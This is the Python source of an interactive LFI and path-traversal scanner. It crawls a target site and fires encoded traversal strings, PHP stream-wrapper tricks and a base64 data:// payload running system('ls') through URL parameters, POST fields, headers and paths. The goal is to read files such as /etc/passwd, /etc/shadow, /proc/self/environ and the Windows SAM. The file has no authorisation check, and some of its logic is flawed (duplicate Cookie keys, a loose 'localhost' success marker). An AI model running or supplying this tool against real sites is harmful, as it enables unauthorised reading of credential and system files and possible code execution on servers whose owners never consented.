# LFI-Scanner
import requests
import os
import sys
import re
import time
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def print_banner():
    banner = r"""
    ███╗   ██╗ ███████╗ ██╗  ██╗ ██╗   ██╗ ███████╗  
    ████╗  ██║ ██╔════╝ ╚██╗██╔╝ ██║   ██║ ██╔════╝  
    ██╔██╗ ██║ █████╗    ╚███╔╝  ██║   ██║ ███████╗  
    ██║╚██╗██║ ██╔══╝    ██╔██╗  ██║   ██║ ╚════██║   
    ██║ ╚████║ ███████╗ ██╔╝ ██╗ ╚██████╔╝ ███████║       
    ╚═╝  ╚═══╝ ╚══════╝ ╚═╝  ╚═╝  ╚═════╝  ╚══════╝       
    [ Path Traversal & LFI Vulnerability Scanner ]"""
    print("\033[1;36m" + banner + "\033[0m")
    print("\033[1;30m" + "=" * 80 + "\033[0m")


def load_default_payloads():
    default_payloads = [
        "../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "../../../../etc/shadow",
        "../../../../etc/hosts",
        "../../../../etc/group",
        "../../../../proc/self/environ",
        "../../../../proc/self/cmdline",
        "../../../../var/log/apache2/access.log",
        "../../../../var/log/nginx/access.log",
        "../../../../var/log/httpd/access.log",
        "..\\..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\..\\boot.ini",
        "..\\..\\..\\..\\windows\\system32\\config\\sam",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252f..%252fetc%252fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "....//....//....//....//etc/passwd",
        "..../..../..../..../etc/passwd",
        "/etc/passwd",
        "/etc/passwd%00",
        "../../../../etc/passwd%00",
        "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=../../../../etc/passwd",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/Pg==",
        "file:///etc/passwd",
        "http://localhost/etc/passwd"
    ]
    return default_payloads


def load_payloads_from_file(filename="payloads.txt"):
    payloads = []
    if os.path.exists(filename):
        try:
            with open(filename, "r", encoding="utf-8") as f:
                payloads = [line.strip() for line in f if line.strip()]
            print(f"\033[1;32m[+]\033[0m Loaded \033[1;33m{len(payloads)}\033[0m payloads from {filename}")
        except Exception as e:
            print(f"\033[1;31m[-]\033[0m Error loading {filename}: {e}")
    else:
        print(f"\033[1;31m[-]\033[0m File {filename} not found!")
    return payloads


def load_payloads(scan_mode="normal"):
    if scan_mode == "deep":
        external_payloads = load_payloads_from_file("payloads.txt")
        if external_payloads:
            return external_payloads
        else:
            print("\033[1;33m[!]\033[0m No external payloads found, using default payloads...")
            return load_default_payloads()
    else:
        default_payloads = load_default_payloads()
        print(f"\033[1;32m[+]\033[0m Loaded \033[1;33m{len(default_payloads)}\033[0m default payloads.")
        return default_payloads


def is_valid_url(url):
    try:
        parsed = urlparse(url)
        return parsed.scheme in ['http', 'https'] and parsed.netloc
    except:
        return False


def extract_links_from_page(url):
    print(f"\n\033[1;34m[*]\033[0m Extracting links from index: \033[4m{url}\033[0m")
    found_links = set()
    found_links.add(url)
    try:
        response = requests.get(url, timeout=5)
        hrefs = re.findall(r'href=["\'](.*?)["\']', response.text)
        parsed_base = urlparse(url)
        base_domain = parsed_base.netloc
        for link in hrefs:
            full_url = urljoin(url, link)
            parsed_link = urlparse(full_url)
            if parsed_link.netloc == base_domain and '#' not in full_url:
                if not re.search(r'\.(css|js|png|jpg|jpeg|gif|ico|svg|pdf)$', parsed_link.path, re.I):
                    found_links.add(full_url)
    except Exception as e:
        print(f"\033[1;31m[-]\033[0m Error extracting links: {e}")
    return list(found_links)


def extract_parameters_from_url(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    lfi_indicators = [
        'file', 'page', 'path', 'dir', 'document', 'folder', 'root',
        'view', 'content', 'id', 'cat', 'include', 'load', 'read',
        'data', 'template', 'theme', 'language', 'url', 'filename',
        'filepath', 'file_name', 'page_id', 'module', 'controller',
        'action', 'param', 'option', 'attachment', 'download',
        'img', 'image', 'picture', 'avatar', 'profile'
    ]
    valid_params = {}
    for param, values in params.items():
        if values and values[0]:
            is_lfi_likely = any(indicator in param.lower() for indicator in lfi_indicators)
            valid_params[param] = {
                'value': values[0],
                'is_lfi_likely': is_lfi_likely
            }
    return valid_params


def smart_url_analysis(target):
    print(f"\n\033[1;34m[*]\033[0m Analyzing target URL...")
    print("\033[1;30m" + "-" * 80 + "\033[0m")
    parsed = urlparse(target)
    params = extract_parameters_from_url(target)
    print(f" \033[1;33mDomain:\033[0m {parsed.netloc}")
    print(f" \033[1;33mPath:\033[0m {parsed.path or '/'}")
    print(f" \033[1;33mProtocol:\033[0m {parsed.scheme}")
    if params:
        print(f" \033[1;33mParameters found:\033[0m \033[1;32m{len(params)}\033[0m")
        lfi_params = [p for p, info in params.items() if info['is_lfi_likely']]
        if lfi_params:
            print(f" \033[1;33mLFI-susceptible parameters:\033[0m \033[1;31m{', '.join(lfi_params)}\033[0m")
        for param, info in params.items():
            likely = "\033[1;32m[LFI-Likely]\033[0m" if info['is_lfi_likely'] else ""
            print(f"   - {param} = {info['value'][:30]} {likely}")
    else:
        print(f" \033[1;33mParameters:\033[0m \033[1;31mNone found\033[0m")
        print(f" \033[1;33mNote:\033[0m Will test POST, Headers, and Direct Path Traversal")
    print("\033[1;30m" + "-" * 80 + "\033[0m")
    return params


def generate_test_urls(base_url, payload, existing_params):
    test_urls = []
    parsed = urlparse(base_url)
    base_without_query = base_url.split('?')[0].rstrip('/')
    if existing_params:
        for param in existing_params.keys():
            new_params = {}
            for p, v in parse_qs(parsed.query).items():
                new_params[p] = v[0] if v else ''
            new_params[param] = payload
            new_query = urlencode(new_params)
            test_urls.append(f"{base_without_query}?{new_query}")
    common_params = [
        'file', 'page', 'path', 'dir', 'document', 'folder', 'root',
        'view', 'content', 'id', 'cat', 'include', 'load', 'read',
        'data', 'template', 'theme', 'language', 'url', 'filename',
        'filepath', 'file_name', 'page_id', 'module', 'controller',
        'action', 'param', 'option', 'attachment', 'download'
    ]
    for param in common_params:
        if not existing_params or param not in existing_params:
            if existing_params:
                new_params = {}
                for p, v in parse_qs(parsed.query).items():
                    new_params[p] = v[0] if v else ''
                new_params[param] = payload
                new_query = urlencode(new_params)
                test_urls.append(f"{base_without_query}?{new_query}")
            else:
                test_urls.append(f"{base_without_query}?{param}={payload}")
    if not existing_params:
        common_directories = [
            '/images/', '/static/', '/assets/', '/files/', '/uploads/',
            '/media/', '/content/', '/documents/', '/downloads/', '/public/',
            '/css/', '/js/', '/img/', '/data/', '/config/', '/include/',
            '/templates/', '/themes/', '/plugins/', '/modules/', '/admin/',
            '/user/', '/profile/', '/account/', '/dashboard/', '/panel/'
        ]
        for path in common_directories:
            test_urls.append(f"{base_without_query}{path}{payload}")
    valid_urls = [url for url in test_urls if is_valid_url(url)]
    return list(set(valid_urls))


def test_post_parameters(target, payloads, existing_params):
    vulnerabilities = []
    post_params = [
        'file', 'page', 'path', 'dir', 'document', 'folder', 'root',
        'view', 'content', 'include', 'load', 'read', 'data',
        'template', 'theme', 'language', 'url', 'filename',
        'image', 'picture', 'avatar', 'profile', 'upload'
    ]
    success_indicators = ["root:x:", "bin:x:", "[extensions]", "for 16-bit app support", "localhost", "uid="]
    print(f"\n\033[1;34m[*]\033[0m Testing POST parameters...")
    prioritized_params = []
    for param in post_params:
        if param in existing_params:
            prioritized_params.insert(0, param)
        else:
            prioritized_params.append(param)
    for param in prioritized_params:
        for payload in payloads:
            try:
                data = {param: payload}
                response = requests.post(target, data=data, timeout=3)
                for indicator in success_indicators:
                    if indicator in response.text:
                        vuln = {
                            'method': f'POST: {param}',
                            'url': target,
                            'payload': payload,
                            'data': data,
                            'indicator': indicator
                        }
                        vulnerabilities.append(vuln)
                        print(f"\033[1;31m[!]\033[0m VULNERABLE POST: \033[1;33m{param}\033[0m = {payload}")
                        break
            except:
                pass
    if not vulnerabilities:
        print("\033[1;33m[-]\033[0m No vulnerable POST parameters found")
    return vulnerabilities


def test_headers(target, payloads):
    vulnerabilities = []
    headers_to_test = {
        'X-Forwarded-For': payloads,
        'X-Forwarded-Host': payloads,
        'X-Original-URL': [f'/{p}' for p in payloads],
        'X-Rewrite-URL': [f'/{p}' for p in payloads],
        'User-Agent': payloads,
        'Referer': payloads,
        'Cookie': [f'file={p}' for p in payloads],
        'Cookie': [f'page={p}' for p in payloads],
        'Cookie': [f'path={p}' for p in payloads],
        'X-HTTP-Method-Override': ['GET'],
        'X-Requested-With': payloads,
        'Accept-Language': [f'../../../../etc/passwd' for _ in payloads]
    }
    success_indicators = ["root:x:", "bin:x:", "[extensions]", "for 16-bit app support", "localhost", "uid="]
    print(f"\n\033[1;34m[*]\033[0m Testing HTTP Headers...")
    for header, header_payloads in headers_to_test.items():
        for payload in header_payloads:
            try:
                headers = {header: payload}
                response = requests.get(target, headers=headers, timeout=3)
                for indicator in success_indicators:
                    if indicator in response.text:
                        vuln = {
                            'method': f'Header: {header}',
                            'url': target,
                            'payload': payload,
                            'headers': headers,
                            'indicator': indicator
                        }
                        vulnerabilities.append(vuln)
                        print(f"\033[1;31m[!]\033[0m VULNERABLE Header: \033[1;33m{header}\033[0m = {payload}")
                        break
            except:
                pass
    if not vulnerabilities:
        print("\033[1;33m[-]\033[0m No vulnerable headers found")
    return vulnerabilities


def test_direct_path(target, payloads):
    vulnerabilities = []
    common_directories = [
        '/images/', '/static/', '/assets/', '/files/', '/uploads/',
        '/media/', '/content/', '/documents/', '/downloads/', '/public/',
        '/css/', '/js/', '/img/', '/data/', '/config/', '/include/',
        '/templates/', '/themes/', '/plugins/', '/modules/', '/admin/',
        '/user/', '/profile/', '/account/', '/dashboard/', '/panel/'
    ]
    success_indicators = ["root:x:", "bin:x:", "[extensions]", "for 16-bit app support", "localhost", "uid="]
    print(f"\n\033[1;34m[*]\033[0m Testing Direct Path Traversal...")
    base_without_query = target.split('?')[0].rstrip('/')
    for path in common_directories:
        for payload in payloads:
            test_url = f"{base_without_query}{path}{payload}"
            try:
                response = requests.get(test_url, timeout=3)
                for indicator in success_indicators:
                    if indicator in response.text:
                        vuln = {
                            'method': 'Direct Path',
                            'url': test_url,
                            'payload': payload,
                            'path': path,
                            'indicator': indicator
                        }
                        vulnerabilities.append(vuln)
                        print(f"\033[1;31m[!]\033[0m VULNERABLE: {test_url}")
                        break
            except:
                pass
    if not vulnerabilities:
        print("\033[1;33m[-]\033[0m No vulnerable direct paths found")
    return vulnerabilities


def test_single_payload(test_url, payload, success_indicators):
    try:
        response = requests.get(test_url, timeout=3)
        matched = any(indicator in response.text for indicator in success_indicators)
        return (test_url, payload, response.status_code, matched)
    except requests.exceptions.RequestException:
        return (test_url, payload, None, False)


def run_parameter_scan(target, payloads, existing_params):
    vulnerabilities = []
    if not existing_params:
        print("\n\033[1;33m[-]\033[0m No parameters to test")
        return vulnerabilities
    success_indicators = ["root:x:", "bin:x:", "[extensions]", "for 16-bit app support", "localhost", "uid="]
    print(f"\n\033[1;34m[*]\033[0m Testing existing parameters ({len(existing_params)} parameters)...")
    tasks = []
    for param in existing_params.keys():
        for payload in payloads:
            test_urls = generate_test_urls(target, payload, existing_params)
            for test_url in test_urls:
                tasks.append((test_url, payload))
    print(f"\n\033[1;33m[*]\033[0m Testing {len(tasks)} parameter-payload combinations...")
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = []
        for test_url, payload in tasks:
            futures.append(executor.submit(test_single_payload, test_url, payload, success_indicators))
        for future in as_completed(futures):
            test_url, payload, status_code, matched = future.result()
            if matched:
                vulnerabilities.append({
                    'method': 'Parameter',
                    'url': test_url,
                    'payload': payload,
                    'code': status_code
                })
                print(f"\033[1;31m[!]\033[0m VULNERABLE: {test_url} | Payload: {payload}")
    if not vulnerabilities:
        print("\033[1;33m[-]\033[0m No vulnerable parameters found")
    return vulnerabilities


def comprehensive_scan(target, payloads, scan_mode="normal"):
    all_vulnerabilities = []
    print("\n" + "=" * 80)
    print(f"\033[1;36m[*]\033[0m Starting Comprehensive LFI Scan ({scan_mode} mode)")
    print("=" * 80)
    existing_params = smart_url_analysis(target)
    vulns = run_parameter_scan(target, payloads, existing_params)
    all_vulnerabilities.extend(vulns)
    vulns = test_post_parameters(target, payloads, existing_params)
    all_vulnerabilities.extend(vulns)
    vulns = test_headers(target, payloads)
    all_vulnerabilities.extend(vulns)
    if not existing_params:
        vulns = test_direct_path(target, payloads)
        all_vulnerabilities.extend(vulns)
    return all_vulnerabilities


def run_full_scanner(targets, payloads, scan_mode="normal"):
    all_vulnerabilities = []
    for target in targets:
        print(f"\n\033[1;36m[*]\033[0m Scanning: {target}")
        print("=" * 80)
        vulns = comprehensive_scan(target, payloads, scan_mode)
        all_vulnerabilities.extend(vulns)
    return all_vulnerabilities


def wait_for_enter():
    print("\n\033[1;33m[+]\033[0m Press \033[1;32mEnter\033[0m to return to main menu...", end="")
    input()
    print()


def main():
    clear_screen()
    print_banner()

    target_input = input("\n\033[1;36m[?] Enter target URL: \033[0m").strip()
    if not target_input or not is_valid_url(target_input):
        print("\033[1;31m[-]\033[0m Invalid URL!")
        time.sleep(2)
        return

    while True:
        clear_screen()
        print_banner()

        print("\033[1;36m[?]\033[0m Select scan mode:")
        print("  \033[1;33m1.\033[0m \033[1;32mNormal Scan\033[0m - Uses built-in payloads ")
        print("  \033[1;33m2.\033[0m \033[1;31mDeep Scan\033[0m - Uses external payloads.txt file ")
        print("  \033[1;33m3.\033[0m \033[1;35mExit\033[0m")

        mode_choice = input("\n\033[1;36m[?] Enter your choice : \033[0m").strip()

        if mode_choice == '3':
            print("\n\033[1;33m[*]\033[0m Exiting...")
            sys.exit()

        if mode_choice not in ['1', '2']:
            print("\033[1;31m[-]\033[0m Invalid choice!")
            time.sleep(1)
            continue

        scan_mode = "normal" if mode_choice == '1' else "deep"

        payloads = load_payloads(scan_mode)
        if not payloads:
            print("\033[1;31m[-]\033[0m No payloads available. Returning to menu...")
            time.sleep(2)
            continue

        while True:
            print(f"\n\033[1;36m[?]\033[0m Choose scan type:")
            print("  \033[1;33m1.\033[0m Comprehensive scan (GET, POST, Headers, Direct Path)")
            print("  \033[1;33m2.\033[0m Parameter-based scan only")
            print("  \033[1;33m3.\033[0m Full scan")
            print("  \033[1;33m4.\033[0m \033[1;35mBack to main menu\033[0m")

            scan_type = input("\n\033[1;36m[?] Enter choice : \033[0m").strip()

            if scan_type == '4':
                break

            all_vulnerabilities = []
            found_vulnerability = False

            if scan_type == '1':
                all_vulns = comprehensive_scan(target_input, payloads, scan_mode)
                all_vulnerabilities.extend(all_vulns)

            elif scan_type == '3':
                choice = input("\n\033[1;36m[?] Scan sub-paths from index? (y/n): \033[0m").strip().lower()
                if choice == 'y':
                    targets = extract_links_from_page(target_input)
                    print(f"\n\033[1;32m[+]\033[0m Discovered \033[1;33m{len(targets)}\033[0m targets")
                    print("\033[1;30m" + "-" * 80 + "\033[0m")
                    for idx, t in enumerate(targets[:15], 1):
                        print(f" \033[1;33m{idx}.\033[0m {t}")
                    if len(targets) > 15:
                        print(f" \033[1;33m... and {len(targets) - 15} more\033[0m")
                    print("\033[1;30m" + "-" * 80 + "\033[0m")
                    all_vulns = run_full_scanner(targets, payloads, scan_mode)
                    all_vulnerabilities.extend(all_vulns)
                else:
                    all_vulns = comprehensive_scan(target_input, payloads, scan_mode)
                    all_vulnerabilities.extend(all_vulns)

            elif scan_type == '2':
                existing_params = extract_parameters_from_url(target_input)
                if existing_params:
                    all_vulns = run_parameter_scan(target_input, payloads, existing_params)
                    all_vulnerabilities.extend(all_vulns)
                else:
                    print("\n\033[1;33m[-]\033[0m No parameters found in URL!")
                    choice = input("\033[1;36m[?]\033[0m Run comprehensive scan anyway? (y/n): \033[0m").strip().lower()
                    if choice == 'y':
                        all_vulns = comprehensive_scan(target_input, payloads, scan_mode)
                        all_vulnerabilities.extend(all_vulns)
            else:
                print("\033[1;31m[-]\033[0m Invalid choice!")
                time.sleep(1)
                continue

            if all_vulnerabilities:
                found_vulnerability = True

            if all_vulnerabilities:
                print("\n" + "=" * 80)
                print(f"\033[1;31m[!]\033[0m Found \033[1;33m{len(all_vulnerabilities)}\033[0m vulnerabilities:")
                print("=" * 80)
                for idx, vuln in enumerate(all_vulnerabilities, 1):
                    print(f"\n\033[1;33m{idx}.\033[0m Method: \033[1;36m{vuln['method']}\033[0m")
                    print(f"   URL: \033[1;32m{vuln['url']}\033[0m")
                    print(f"   Payload: \033[1;35m{vuln['payload']}\033[0m")
                    if 'indicator' in vuln:
                        print(f"   Indicator: \033[1;33m{vuln['indicator']}\033[0m")
                    if 'code' in vuln:
                        print(f"   Status Code: {vuln['code']}")
                    if 'headers' in vuln:
                        print(f"   Headers: {vuln['headers']}")
                    if 'data' in vuln:
                        print(f"   POST Data: {vuln['data']}")
                print("\n\033[1;32m[+]\033[0m Scan completed successfully!")
                print(
                    f"\033[1;32m[+]\033[0m Found \033[1;33m{len(all_vulnerabilities)}\033[0m potential vulnerabilities")
            else:
                print("\n\033[1;33m[-]\033[0m No vulnerabilities found")

            if found_vulnerability:
                wait_for_enter()
            else:
                print("\n\033[1;33m[*]\033[0m Returning to main menu ...")
                for i in range(3, 0, -1):
                    print(f"\033[1;33m[{i}]\033[0m ", end="", flush=True)
                    time.sleep(1)
                print()

            break


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n\033[1;33m[*]\033[0m Scan interrupted by user. Exiting...")
        sys.exit()
